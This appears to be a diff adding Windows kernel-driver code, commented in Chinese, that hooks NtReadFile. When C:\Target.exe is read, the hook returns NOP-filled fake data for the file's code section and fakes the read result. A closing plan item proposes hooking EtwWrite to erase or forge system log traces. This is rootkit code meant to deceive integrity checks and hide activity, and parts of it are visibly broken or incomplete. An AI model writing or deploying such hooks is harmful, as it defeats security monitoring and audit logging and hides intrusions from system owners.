@@ -110,6 +110,102 @@
         return STATUS_SUCCESS;
     }
 
+    // 在文件中读取文件的中的偏移和大小
+    NTSTATUS ParsePeHeader(HANDLE FileHandle, ULONG_PTR* codeStart, ULONG* codeSize) {
+      // 读取PE头
+      IO_STATUS_BLOCK ioStatus;
+      LARGE_INTEGER offset = {0};
+      UCHAR peHeader[0x1000];
+      NTSTATUS status = ZwReadFile(FileHandle, NULL, NULL, NULL, &ioStatus, peHeader, 0x1000, &offset, NULL);
+      if (!NT_SUCCESS(status)) return status;
+  
+      // 解析.text段
+      PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peHeader;
+      PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)dos + dos->e_lfanew);
+      PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+      for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
+          if (strncmp((CHAR*)section->Name, ".text", 5) == 0) {
+              *codeStart = section->PointerToRawData;
+              *codeSize = section->SizeOfRawData;
+              return STATUS_SUCCESS;
+          }
+      }
+      return STATUS_NOT_FOUND;
+    }
+
+    // 定义原始函数指针
+    typedef NTSTATUS (*NtReadFile_t)(
+        HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID,
+        PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG
+    );
+    NtReadFile_t OriginalNtReadFile;
+
+    // Hook 函数
+    NTSTATUS HookedNtReadFile(
+        HANDLE FileHandle,
+        HANDLE Event,
+        PIO_APC_ROUTINE ApcRoutine,
+        PVOID ApcContext,
+        PIO_STATUS_BLOCK IoStatusBlock,
+        PVOID Buffer,
+        ULONG Length,
+        PLARGE_INTEGER ByteOffset,
+        PULONG Key
+    ) {
+        NTSTATUS status;
+        BOOLEAN isTargetFile = FALSE;
+        
+        // 1. 获取文件路径
+        PFILE_OBJECT fileObject;
+        status = ObReferenceObjectByHandle(FileHandle, FILE_READ_DATA, *IoFileObjectType, KernelMode, (PVOID*)&fileObject, NULL);
+        if (NT_SUCCESS(status)) {
+            POBJECT_NAME_INFORMATION nameInfo;
+            UNICODE_STRING targetPath = RTL_CONSTANT_STRING(L"\\??\\C:\\Target.exe");
+            status = IoQueryFileDosDeviceName(fileObject, &nameInfo);
+            if (NT_SUCCESS(status) && RtlCompareUnicodeString(&nameInfo->Name, &targetPath, TRUE) == 0) {
+                isTargetFile = TRUE;
+            }
+            ExFreePool(nameInfo);
+            ObDereferenceObject(fileObject);
+        }
+    
+        // 2. 检查是否为代码段读取
+        if (isTargetFile) {
+            // 解析PE头获取.text段文件偏移和大小
+            LARGE_INTEGER offset = {0};
+            ULONG readSize = 0;
+            if (ByteOffset) offset = *ByteOffset;
+            else {
+                // 若未指定偏移，需从文件当前位置获取（需同步处理）
+                KPROCESSOR_MODE prevMode = ExGetPreviousMode();
+                KeStackAttachProcess(PsGetCurrentProcess(), &apcState);
+                status = ZwQueryInformationFile(FileHandle, IoStatusBlock, &offset, sizeof(offset), FilePositionInformation);
+                KeUnstackDetachProcess(&apcState);
+            }
+    
+            // 假设.text段文件偏移为0x400，大小0x1000
+            if (offset.QuadPart >= 0x400 && offset.QuadPart < (0x400 + 0x1000)) {
+                // 3. 伪造数据
+                PVOID fakeData = ExAllocatePoolWithTag(NonPagedPool, Length, 'Fake');
+                RtlFillMemory(fakeData, Length, 0x90); // 填充NOP指令
+                __try {
+                    ProbeForWrite(Buffer, Length, 1);
+                    RtlCopyMemory(Buffer, fakeData, Length);
+                    IoStatusBlock->Information = Length; // 伪造实际读取字节数
+                } __except (EXCEPTION_EXECUTE_HANDLER) {
+                    status = GetExceptionCode();
+                }
+                ExFreePool(fakeData);
+                return status; // 直接返回，不调用原始函数
+            }
+        }
+    
+          // 4. 调用原始函数
+          return OriginalNtReadFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
+    }
+
+    
+
 
   9. hook Ewtwrite 函数，清理/伪造系统日志痕迹 （具体思路需要按调试后调整）
     
